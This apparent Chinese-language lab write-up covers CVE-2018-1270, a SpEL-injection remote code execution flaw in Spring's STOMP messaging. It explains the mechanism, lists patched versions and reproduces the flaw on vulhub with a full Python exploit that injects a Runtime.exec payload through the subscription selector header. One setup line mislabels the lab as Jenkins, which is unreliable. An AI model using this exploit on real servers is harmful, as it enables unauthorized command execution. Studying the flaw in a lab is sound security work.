---
title: 信安实训1
date: 2021-12-25 23:45:55
tags:	
	- 远程代码执行漏洞



---

<!--more-->

#  远程命令执行漏洞（CVE-2018-1270）

## 漏洞描述：

2018年4月5日，Pivotal Spring官方发布安全公告，Spring框架中存在三个漏洞,其中编号为CVE-2018-1270的漏洞可导致远程代码执行。

360-CERT通过对此漏洞进行了相关分析，认为漏洞影响严重；目前相关PoC已经被发布，建议相关用户尽快进行评估升级。

## 漏洞影响

​		**影响版本**

1. Spring Framework 5.0 to 5.0.4.

2. Spring Framework 4.3 to 4.3.14

3. 已不支持的旧版本仍然受影响

   **修复版本**

4. 5.0.x 用户升级到5.0.5版本

5. 4.3.x 用户升级到4.3.15版本

## 漏洞详情

Spring框架中通过socket的简单消息协议。攻击者可以通过建立WebSocket连接并发送一条消息造成**远程代码执行**。

## 机制分析

###  **SpEL**

Spring表达式语言全称Spring Expression Language，支持查询和操作运行时对象导航图功能.。语法类似于传统EL，而且供额外的功能，能够进行函数调用和简单字符串的模板函数。

该漏洞本质是Spel表达式注入，Spel表达式注入的关键代码为：

```
java  
String expression = "T(java.lang.Runtime).getRuntime().exec(/"calc/")";  
String result = parser.parseExpression(expression).getValue().toString();  
```

### STOMP

(Simple Text-Orientated Messaging Protocol) 面向消息的简单文本协议，用于服务器在客户端之间进行异步消息传递。STOMP帧由命令，一个或多个头信息、一个空行及负载（文本或字节）所组成

![image-20211219173700656](https://s2.loli.net/2022/03/26/o7k2RtYEMVIurSX.png)

其中可用的COMMAND包括：

CONNECT、SEND、SUBSCRIBE、UNSUBSCRIBE、BEGIN、COMMIT、ABORT、ACK、NACK、DISCONNECT

客户端可以使用SEND命令来发送消息以及描述消息的内容，用SUBSCRIBE命令来订阅消息以及由谁来接收消息。这样就可以建立一个发布订阅系统，消息可以从客户端发送到服务器进行操作，服务器也可以推送消息到客户端。

**通讯过程：**

1、客户端与服务器进行HTTP握手连接

2、客户端通过发送CONNECT帧建立连接

3、服务器端接收到连接尝试返回CONNECTED帧

4、客户端通过SUBSCRIBE向服务端订阅消息主题

5、客户端通过SEND向服务端发送消息

![image-20211219174143847](https://s2.loli.net/2022/03/26/A8hWnbcwmIujVdD.png)

其中静态资源app.js运行在客户端与服务器做websocket交互，使用connect()函数建立Stomp链接

connect接受一个可选的headers参数用来标识附加的头部，默认情况下，如果没有在headers额外添加，这个库会默认构建一个独一无二的ID。用户定义的headers通常用于允许使用者在进行订阅帧中的selector来过滤基于应用程序定义的headers消息。

## 漏洞分析

客户端在发送send message时会调用getValue。

![image-20211219174951528](https://s2.loli.net/2022/03/26/ATuF4p97LSZthKm.png)

在sendMessageToSubscribers处下断点详细跟踪，发现后端通过客户端的订阅ID  subId来确认具体会话，并从会话headers中获取selector值当作expression最后执行，expression.getValue()存在表达式执行的风险，那么这里的headers在之前的STOMP机制介绍中有提到过，headers可以在客户端进行定义，也就是说只要我们在headers当中的selector传入poc就可以达到表达式注入的目的。

![image-20211219175028829](https://s2.loli.net/2022/03/26/4dqQpVZmRoCrcsB.png)

而headers根据我们之前的介绍，它会在CONNECT阶段就定义好了，也就是说这个漏洞需要两步触发：

1. 在客户端定义headers并且其中包含selector，这里传入spel，服务端和客户端建立起连接后，服务端接收到SUBSCRIBE订阅消息并获取headers
2. 客户端发送消息，服务端在当前会话中查找headers中的selector值最终执行

## 漏洞复现

使用[vulhub](https://github.com/vulhub/vulhub)复现
 一、启动Jenkins LTS 2.46.1：

```
cd /vulhub/spring/CVE-2018-1270
docker-compose up -d   
```

启动完成后可以成功访问`http://your-ip:8080`

![image-20211208152852470](https://s2.loli.net/2022/03/26/SqgD3w5XeTj8yfB.png)

发送数据包
python3 exp.py 

EXP：

```
#!/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))


class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
            'Referer': url,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
        self.t = int(time.time()*1000)

    def run(self):
        url = f'{self.base}/htmlfile?c=_jp.vulhub'
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)
    
    def send(self, command, headers, body=''):
        data = [command.upper(), '\n']

        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))
        
        data.append('\n\n')
        data.append(body)
        data.append('\x00')
        data = json.dumps([''.join(data)])

        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)
        if response.status_code != 204:
            logging.info(f"send '{command}' data error.")
        else:
            logging.info(f"send '{command}' data success.")

    def __del__(self):
        self.session.close()


sockjs = SockJS('http://192.168.188.133:8080/gs-guide-websocket')
sockjs.start()
time.sleep(1)

sockjs.send('connect', {
    'accept-version': '1.1,1.0',
    'heart-beat': '10000,10000'
})
sockjs.send('subscribe', {
    'selector': "T(java.lang.Runtime).getRuntime().exec('touch /tmp/cve-2018-1270_success')",
    'id': 'sub-0',
    'destination': '/topic/greetings'
})

data = json.dumps({'name': 'vulhub'})
sockjs.send('send', {
    'content-length': len(data),
    'destination': '/app/hello'
}, data)

```

![image-20211219175743468](https://s2.loli.net/2022/03/26/OGBoeyxjqXi98zn.png)

```
sudo docker ps   查看docker容器名字
```

进入容器查看 sudo docker exec -it  容器名  /bin/bash ，可以看见一个CVE-2018-1270_success已经创建。

![](https://s2.loli.net/2022/03/26/OGBoeyxjqXi98zn.png)

## 补充

SockJS:SockJS是一个浏览器上运行的JavaScript库，如果浏览器不支持WebSocket，该库可以模拟对WebSocket的支持，实现浏览器和Web服务器之间低延迟、全双工、跨域的通讯通道。

